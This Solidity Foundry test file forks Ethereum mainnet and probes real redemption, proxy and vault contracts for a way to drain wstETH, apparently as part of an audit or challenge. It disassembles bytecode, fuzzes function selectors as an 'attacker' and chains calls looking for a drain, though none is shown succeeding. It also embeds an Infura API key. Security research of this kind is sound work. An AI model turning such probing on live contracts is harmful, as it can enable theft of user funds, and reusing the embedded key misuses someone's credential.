// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract DelegatecallSlot1045 is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;
    address constant SAFE_AT_SLOT4 = 0xB38f2aCb7B562475908c0C6E80a045Deb4023f70;
    address constant IMPLEMENTATION = 0x434B68B11bBE8FD3074089397cA3d275801d6354;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeSloadAt995() public view {
        console.log("=== ANALYZING SLOAD AT OFFSET 995 ===\n");

        bytes memory code = REDEMPTION_1.code;

        // Look at bytecode around offset 995-1045
        console.log("Bytecode from 980 to 1060:");

        for (uint i = 980; i < 1060 && i < code.length; i++) {
            uint8 op = uint8(code[i]);

            if (op == 0x54) console.log(i, "SLOAD");
            if (op == 0x55) console.log(i, "SSTORE");
            if (op == 0x5b) console.log(i, "JUMPDEST");
            if (op == 0xf4) console.log(i, "DELEGATECALL");
            if (op == 0x33) console.log(i, "CALLER");

            if (op == 0x60) { // PUSH1
                uint8 val = uint8(code[i+1]);
                console.log(i, "PUSH1:", val);
            }
            if (op == 0x61) { // PUSH2
                uint16 val = uint16(uint8(code[i+1])) << 8 | uint16(uint8(code[i+2]));
                console.log(i, "PUSH2:", val);
            }
        }
    }

    function test_CheckSlot5InRedemption1() public view {
        console.log("=== CHECKING SLOT 5 IN REDEMPTION_1 ===\n");

        // The SLOAD at 995 might load slot 5 (implementation)
        bytes32 slot5 = vm.load(REDEMPTION_1, bytes32(uint256(5)));
        console.log("Slot 5:");
        console.logBytes32(slot5);
        console.log("As address:", address(uint160(uint256(slot5))));

        // Check all slots
        console.log("\nAll REDEMPTION_1 storage:");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(REDEMPTION_1, bytes32(i));
            if (slot != bytes32(0)) {
                address addr = address(uint160(uint256(slot)));
                console.log("Slot", i, ":");
                console.logBytes32(slot);
                if (addr.code.length > 0) {
                    console.log("  Contract code:", addr.code.length);
                }
            }
        }
    }

    function test_WhatDoesC5d664c6Do() public {
        console.log("=== WHAT DOES 0xc5d664c6 DO? ===\n");

        // This selector succeeds - let's trace what it does

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerIAUBefore = IERC20(IAU).balanceOf(attacker);

        deal(IAU, attacker, 100000e18);

        vm.startPrank(attacker);
        IERC20(IAU).approve(REDEMPTION_1, type(uint256).max);

        console.log("Before call:");
        console.log("  Attacker IAU:", IERC20(IAU).balanceOf(attacker) / 1e18);
        console.log("  Vault wstETH:", vaultBefore / 1e18);

        // Try with different parameters
        console.log("\nTrying c5d664c6 with various params:");

        (bool s1, bytes memory d1) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0xc5d664c6))
        );
        console.log("No params:", s1);
        if (d1.length > 0) console.log("  Return length:", d1.length);

        (bool s2, bytes memory d2) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0xc5d664c6), 100e18)
        );
        console.log("With uint256:", s2);
        if (d2.length > 0) console.log("  Return length:", d2.length);

        (bool s3, bytes memory d3) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0xc5d664c6), 100e18, attacker)
        );
        console.log("With uint256+address:", s3);
        if (d3.length > 0) console.log("  Return length:", d3.length);

        vm.stopPrank();

        console.log("\nAfter call:");
        console.log("  Attacker IAU:", IERC20(IAU).balanceOf(attacker) / 1e18);
        console.log("  Vault wstETH:", IERC20(wstETH).balanceOf(VAULT) / 1e18);
        console.log("  Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);

        // Check REDEMPTION_1 storage after call
        console.log("\nREDEMPTION_1 storage after c5d664c6:");
        for (uint i = 0; i < 15; i++) {
            bytes32 slot = vm.load(REDEMPTION_1, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("Slot", i, ":");
                console.logBytes32(slot);
            }
        }
    }

    function test_WhatDoesEda72134Do() public {
        console.log("=== WHAT DOES 0xeda72134 DO? ===\n");

        deal(IAU, attacker, 100000e18);

        vm.startPrank(attacker);
        IERC20(IAU).approve(REDEMPTION_1, type(uint256).max);

        console.log("Trying eda72134:");

        (bool s1, bytes memory d1) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0xeda72134))
        );
        console.log("No params:", s1);
        if (d1.length >= 32) {
            console.log("  Return:", abi.decode(d1, (uint256)));
        }

        (bool s2, bytes memory d2) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0xeda72134), 100e18)
        );
        console.log("With uint256:", s2);
        if (d2.length >= 32) {
            console.log("  Return:", abi.decode(d2, (uint256)));
        }

        vm.stopPrank();
    }

    function test_TraceEntryTo1045() public view {
        console.log("=== TRACING ENTRY TO DELEGATECALL AT 1045 ===\n");

        bytes memory code = REDEMPTION_1.code;

        // Find which selectors route to area around 1045
        console.log("Looking for selectors that route to 900-1100 range:");

        for (uint i = 0; i < 600 && i < code.length; i++) {
            if (uint8(code[i]) == 0x63) { // PUSH4
                bytes4 sel = bytes4(bytes.concat(
                    code[i+1], code[i+2], code[i+3], code[i+4]
                ));
                if (sel == bytes4(0) || sel == bytes4(0xffffffff)) continue;
                if (uint32(sel) < 0x1000) continue;

                // Look for PUSH2 after
                for (uint j = i + 5; j < i + 20 && j < code.length; j++) {
                    if (uint8(code[j]) == 0x61) {
                        uint16 dest = uint16(uint8(code[j+1])) << 8 | uint16(uint8(code[j+2]));
                        if (dest >= 900 && dest <= 1100) {
                            console.log("Selector:");
                            console.logBytes4(sel);
                            console.log("  -> Jump to:", dest);
                        }
                        break;
                    }
                }
            }
        }
    }

    function test_TrySelectorsThatRouteNear1045() public {
        console.log("=== TRYING SELECTORS THAT ROUTE NEAR 1045 ===\n");

        // From earlier analysis:
        // cff50c6e -> 973
        // e30c3978 -> 992
        // eda72134 -> 1022
        // f2fde38b -> 1061
        // fd424ea8 -> 1080

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        deal(IAU, attacker, 100000e18);

        vm.startPrank(attacker);
        IERC20(IAU).approve(REDEMPTION_1, type(uint256).max);

        bytes4[] memory sels = new bytes4[](5);
        sels[0] = bytes4(0xcff50c6e);
        sels[1] = bytes4(0xe30c3978);
        sels[2] = bytes4(0xeda72134);
        sels[3] = bytes4(0xf2fde38b);
        sels[4] = bytes4(0xfd424ea8);

        for (uint i = 0; i < sels.length; i++) {
            console.logBytes4(sels[i]);

            // Try with various param combinations
            (bool s1,) = REDEMPTION_1.call(
                abi.encodeWithSelector(sels[i], attacker)
            );
            console.log("  (address):", s1);

            (bool s2,) = REDEMPTION_1.call(
                abi.encodeWithSelector(sels[i], 100e18)
            );
            console.log("  (uint):", s2);

            (bool s3,) = REDEMPTION_1.call(
                abi.encodeWithSelector(sels[i], 100e18, attacker)
            );
            console.log("  (uint,address):", s3);

            uint256 bal = IERC20(wstETH).balanceOf(attacker);
            if (bal > 0) {
                console.log("*** GOT wstETH! ***");
                break;
            }
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault change:", int256(vaultAfter) - int256(vaultBefore));
    }

    function test_AnalyzeImplementationSelectors() public view {
        console.log("=== ANALYZING IMPLEMENTATION SELECTORS ===\n");

        // The implementation at slot 5 might have functions
        // that route to RC.redeem when called via delegatecall

        bytes memory code = IMPLEMENTATION.code;
        console.log("Implementation code size:", code.length);

        console.log("\nFunction selectors:");
        for (uint i = 0; i + 4 < code.length; i++) {
            if (uint8(code[i]) == 0x63) {
                bytes4 sel = bytes4(bytes.concat(
                    code[i+1], code[i+2], code[i+3], code[i+4]
                ));
                if (sel == bytes4(0) || sel == bytes4(0xffffffff)) continue;
                if (uint32(sel) < 0x1000) continue;
                console.logBytes4(sel);
            }
        }
    }

    function test_TryImplementationViaRedemption1() public {
        console.log("=== TRYING IMPLEMENTATION FUNCTIONS VIA REDEMPTION_1 ===\n");

        // Implementation selectors: 0x8da5cb5b, 0xddca3f43, 0xe30c3978, 0xf2fde38b,
        // 0x69fe0e2d, 0x715018a6, 0x781b7e08, 0x79ba5097, 0x43000818

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        vm.startPrank(attacker);

        // Try implementation functions on REDEMPTION_1
        // These should be delegatecall'd to implementation

        // 0x69fe0e2d = setFee(uint256)
        console.log("Trying setFee on REDEMPTION_1:");
        (bool s1, bytes memory d1) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0x69fe0e2d), 9999)
        );
        console.log("Success:", s1);
        if (!s1 && d1.length >= 4) {
            console.logBytes4(bytes4(d1));
        }

        // 0x781b7e08 - unknown function
        console.log("\nTrying 0x781b7e08 on REDEMPTION_1:");
        (bool s2, bytes memory d2) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0x781b7e08), attacker, 100e18)
        );
        console.log("Success:", s2);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault change:", int256(vaultAfter) - int256(vaultBefore));
    }

    function test_InvestigateProxyPattern() public view {
        console.log("=== INVESTIGATING PROXY PATTERN ===\n");

        // Check if REDEMPTION_1 is a transparent proxy
        // In transparent proxy, admin calls don't get delegated

        bytes memory code = REDEMPTION_1.code;

        // Look for the proxy admin check pattern
        // Usually: if caller == admin, don't delegate

        console.log("First 300 bytes of REDEMPTION_1:");
        for (uint i = 0; i < 300 && i < code.length; i++) {
            uint8 op = uint8(code[i]);

            if (op == 0x33) console.log(i, "CALLER");
            if (op == 0x54) console.log(i, "SLOAD");
            if (op == 0x14) console.log(i, "EQ");
            if (op == 0x57) console.log(i, "JUMPI");
            if (op == 0xf4) console.log(i, "DELEGATECALL");

            if (op == 0x60) { // PUSH1
                uint8 val = uint8(code[i+1]);
                if (val < 20) { // Likely a slot number
                    console.log(i, "PUSH1 (slot?):", val);
                }
            }
        }
    }

    function test_CheckActionChainSetup() public {
        console.log("=== CHECKING ACTION CHAIN SETUP ===\n");

        // The hint "action chaining" might mean:
        // 1. Call function A to set state
        // 2. Call function B that uses that state to drain

        // Let's try c5d664c6 first, then something else

        deal(IAU, attacker, 100000e18);

        vm.startPrank(attacker);
        IERC20(IAU).approve(REDEMPTION_1, type(uint256).max);

        // Step 1: Setup
        console.log("Step 1: c5d664c6");
        (bool s1,) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0xc5d664c6), 100e18)
        );
        console.log("Success:", s1);

        // Check what changed
        console.log("\nStorage after step 1:");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(REDEMPTION_1, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("Slot", i);
            }
        }

        // Step 2: Try to drain
        console.log("\nStep 2: Trying various drain functions");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        // Try selectors that might use the setup state
        bytes4[] memory sels = new bytes4[](5);
        sels[0] = bytes4(0xfd424ea8);
        sels[1] = bytes4(0x9307e802);
        sels[2] = bytes4(0xb2118a8d);
        sels[3] = bytes4(0x778d364f);
        sels[4] = bytes4(0x36600461);

        for (uint i = 0; i < sels.length; i++) {
            (bool s,) = REDEMPTION_1.call(
                abi.encodeWithSelector(sels[i], attacker, 100e18)
            );
            uint256 bal = IERC20(wstETH).balanceOf(attacker);
            if (bal > 0) {
                console.log("*** DRAINED with:");
                console.logBytes4(sels[i]);
                break;
            }
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault change:", int256(vaultAfter) - int256(vaultBefore));
    }
}
